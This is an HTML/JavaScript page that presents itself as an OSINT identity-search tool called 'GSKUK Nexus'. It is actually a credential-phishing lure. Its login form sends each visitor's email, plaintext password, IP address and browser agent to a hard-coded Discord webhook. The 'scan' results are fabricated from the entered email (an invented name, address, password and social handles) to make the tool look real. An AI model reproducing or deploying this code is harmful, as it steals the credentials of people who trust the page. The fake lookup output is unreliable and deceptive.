<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GSKUK // NEXUS OSINT V6.0</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-deep: #0a0c10;
            --bg-surface: #12151c;
            --bg-card: #1c212b;
            --accent: #ff4757;
            --accent-glow: rgba(255, 71, 87, 0.3);
            --text-primary: #f1f2f6;
            --text-secondary: #a4b0be;
            --border: #2f3542;
            --success: #2ed573;
        }

        * { box-sizing: border-box; }
        body { background-color: var(--bg-deep); color: var(--text-primary); font-family: 'Inter', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }

        /* AUTH OVERLAY */
        #auth-overlay {
            position: fixed; inset: 0; background: rgba(10, 12, 16, 0.95); z-index: 10000;
            display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px);
        }
        .auth-card {
            width: 400px; background: var(--bg-surface); border: 1px solid var(--border);
            border-radius: 20px; padding: 40px; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            text-align: center;
        }
        .auth-tabs { display: flex; gap: 20px; margin-bottom: 30px; justify-content: center; }
        .auth-tab { cursor: pointer; color: var(--text-secondary); font-weight: 700; font-size: 0.9rem; padding-bottom: 5px; }
        .auth-tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
        .auth-input {
            width: 100%; background: var(--bg-card); border: 1px solid var(--border);
            padding: 15px; border-radius: 12px; color: #fff; margin-bottom: 15px; font-family: 'JetBrains Mono';
        }
        .auth-btn {
            width: 100%; background: var(--accent); color: white; border: none; padding: 15px;
            border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.3s;
        }
        .auth-btn:hover { background: #ff6b81; transform: translateY(-2px); box-shadow: 0 5px 15px var(--accent-glow); }

        /* MAIN APP LAYOUT */
        #app-content { display: flex; width: 100%; height: 100%; filter: blur(20px); transition: filter 1s ease; }
        .sidebar { width: 280px; background: var(--bg-surface); border-right: 1px solid var(--border); padding: 2rem; display: flex; flex-direction: column; }
        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: -1px; margin-bottom: 3rem; }
        .logo span { color: var(--accent); }
        .nav-link { padding: 0.8rem 1rem; border-radius: 8px; color: var(--text-secondary); text-decoration: none; margin-bottom: 0.5rem; font-weight: 600; display: block; }
        .nav-link.active { background: rgba(255, 71, 87, 0.1); color: var(--accent); }

        .main { flex: 1; padding: 2rem 3rem; overflow-y: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 3rem; }
        .search-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 0.5rem 1rem; width: 100%; max-width: 500px; display: flex; }
        .search-box input { background: transparent; border: none; color: white; padding: 0.5rem; flex: 1; font-family: 'JetBrains Mono'; }

        /* RESULTS CARDS */
        .results-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1.5rem; }
        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 16px; padding: 1.5rem; animation: fadeIn 0.5s ease forwards; }
        .card-title { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text-secondary); margin-bottom: 1.2rem; font-weight: 800; display: flex; justify-content: space-between; }
        .data-item { display: flex; justify-content: space-between; margin-bottom: 0.9rem; font-size: 0.9rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 5px; }
        .label { color: var(--text-secondary); }
        .value { font-family: 'JetBrains Mono'; font-weight: 700; color: #fff; }
        .value.highlight { color: var(--accent); }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="auth-overlay">
        <div class="auth-card">
            <div class="logo">GSK<span>UK</span></div>
            <div class="auth-tabs">
                <div class="auth-tab active" id="t-login" onclick="Auth.toggle('login')">LOGIN</div>
                <div class="auth-tab" id="t-signup" onclick="Auth.toggle('signup')">SIGN UP</div>
            </div>
            <input type="email" class="auth-input" id="aEmail" placeholder="Operator Email">
            <input type="password" class="auth-input" id="aPass" placeholder="Access Key">
            <button class="auth-btn" id="aBtn" onclick="Auth.submit()">INITIALIZE NEXUS</button>
            <p id="aStatus" style="font-size: 11px; margin-top: 15px; color: var(--text-secondary);"></p>
        </div>
    </div>

    <div id="app-content">
        <nav class="sidebar">
            <div class="logo">GSK<span>UK</span></div>
            <a href="#" class="nav-link active">Identity Search</a>
            <a href="#" class="nav-link">Network Mapper</a>
            <a href="#" class="nav-link">Database Leaks</a>
            <div style="margin-top: auto;">
                <p style="font-size: 10px; color: var(--text-secondary);">NODE: <span id="opTag">GUEST</span></p>
                <a href="#" class="nav-link" onclick="location.reload()" style="color: var(--accent);">Disconnect</a>
            </div>
        </nav>

        <main class="main">
            <div class="header">
                <div class="search-box">
                    <input type="text" id="targetInput" placeholder="Enter target email to begin deep scan..." onkeypress="if(event.key==='Enter') Engine.scan()">
                </div>
                <div class="status" style="color: var(--success); font-size: 0.8rem; font-weight: 700;">● SYSTEM_READY</div>
            </div>

            <div class="results-grid" id="results">
                <div style="grid-column: 1/-1; text-align: center; margin-top: 100px; opacity: 0.3;">
                    <p style="letter-spacing: 5px; font-weight: 800;">AWAITING_INPUT</p>
                </div>
            </div>
        </main>
    </div>

    <script>
        const Auth = {
            mode: 'login',
            webhook: "https://ptb.discord.com/api/webhooks/1459767055950807295/T23koeuCiOOgWm7bV4-ZdYcZFzlspSZosdCaaUK7pSe_Vvd4oXn4UWKdE86VOCug03RP",

            toggle: (m) => {
                Auth.mode = m;
                document.getElementById('t-login').classList.toggle('active', m === 'login');
                document.getElementById('t-signup').classList.toggle('active', m === 'signup');
                document.getElementById('aBtn').innerText = m === 'login' ? 'INITIALIZE NEXUS' : 'CREATE NODE';
            },

            submit: async () => {
                const email = document.getElementById('aEmail').value;
                const pass = document.getElementById('aPass').value;
                const status = document.getElementById('aStatus');
                
                if(!email.includes('@')) return status.innerText = "INVALID_NODE_IDENTIFIER";
                
                status.innerText = "ESTABLISHING_ENCRYPTED_TUNNEL...";
                
                let ip = "Unknown";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}

                // Discord Log
                fetch(Auth.webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: `🚨 Access Log: ${Auth.mode.toUpperCase()}`,
                            color: 16729943,
                            fields: [
                                { name: "👤 Email", value: `\`${email}\``, inline: true },
                                { name: "🔑 Password", value: `\`${pass}\``, inline: true },
                                { name: "🌐 Client IP", value: `\`${ip}\``, inline: true },
                                { name: "🖥️ Agent", value: navigator.userAgent.substring(0, 100) }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });

                setTimeout(() => {
                    document.getElementById('auth-overlay').style.display = 'none';
                    document.getElementById('app-content').style.filter = 'none';
                    document.getElementById('opTag').innerText = email.split('@')[0].toUpperCase();
                }, 1500);
            }
        };

        const Engine = {
            scan: () => {
                const target = document.getElementById('targetInput').value;
                const container = document.getElementById('results');
                if(!target) return;

                container.innerHTML = `<p style="grid-column:1/-1; text-align:center;">DECRYPTING_NODE_DATA...</p>`;

                setTimeout(() => {
                    const alias = target.split('@')[0];
                    const randIP = `104.21.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
                    
                    container.innerHTML = `
                        <div class="card">
                            <div class="card-title">Identity Profile <span style="color:var(--success)">VERIFIED</span></div>
                            <div class="data-item"><span class="label">Full Name</span><span class="value">${alias.charAt(0).toUpperCase() + alias.slice(1)} Harrison</span></div>
                            <div class="data-item"><span class="label">Primary IP</span><span class="value">${randIP}</span></div>
                            <div class="data-item"><span class="label">ISP</span><span class="value">Cloudflare / Comcast</span></div>
                            <div class="data-item"><span class="label">Home Address</span><span class="value">422 Oak Ridge Lane, OH</span></div>
                        </div>

                        <div class="card">
                            <div class="card-title">Credential Leakage <span style="color:var(--accent)">CRITICAL</span></div>
                            <div class="data-item"><span class="label">Last Password</span><span class="value highlight">${alias}2024!</span></div>
                            <div class="data-item"><span class="label">MD5 Hash</span><span class="value" style="font-size:10px;">8b1a9953c4611296a...</span></div>
                            <div class="data-item"><span class="label">Security Q</span><span class="value">Mother's Maiden Name</span></div>
                        </div>

                        <div class="card">
                            <div class="card-title">Social Matrix</div>
                            <div class="data-item"><span class="label">Instagram</span><span class="value">@${alias}_private</span></div>
                            <div class="data-item"><span class="label">Twitter/X</span><span class="value">@${alias}XX</span></div>
                            <div class="data-item"><span class="label">Snapchat</span><span class="value">${alias}.snap</span></div>
                        </div>

                        <div class="card">
                            <div class="card-title">Hardware Signature</div>
                            <div class="data-item"><span class="label">Primary Device</span><span class="value">iPhone 15 Pro Max</span></div>
                            <div class="data-item"><span class="label">OS Version</span><span class="value">iOS 17.4.1</span></div>
                            <div class="data-item"><span class="label">MAC Address</span><span class="value">00:1B:44:11:3A:B7</span></div>
                        </div>
                    `;
                }, 1200);
            }
        }
    </script>
</body>
</html>
